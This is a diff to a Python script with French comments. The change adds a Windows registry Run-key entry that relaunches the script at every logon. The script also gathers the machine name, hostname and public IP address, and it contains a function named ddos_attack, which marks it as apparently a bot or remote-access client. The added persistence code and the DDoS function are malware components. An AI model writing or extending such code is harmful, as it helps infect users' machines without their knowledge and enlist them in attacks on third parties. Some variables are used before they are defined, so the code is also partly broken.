@@ -23,6 +23,27 @@ import socket
 ordi = platform.uname()
 hostname = socket.gethostname()
 
+if script_path is None:
+    script_path = os.path.abspath(__file__)
+
+    # Chemin vers python.exe utilisé pour lancer ton script
+    python_exe = sys.executable
+
+    # Commande complète à lancer au démarrage
+    command = f'"{python_exe}" "{script_path}"'
+
+    # On ouvre la clé Run dans le registre
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+
+    # On écrit la commande dans la clé
+    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
+    winreg.CloseKey(key)
+
 ip = requests.get("https://api.ipify.org").text
 name = (
     f"Nom de l'ordinateur : {ordi.node}\n"
@@ -171,4 +192,5 @@ def ddos_attack():
 
 
 # Appel de la fonction
+
 loop_check()
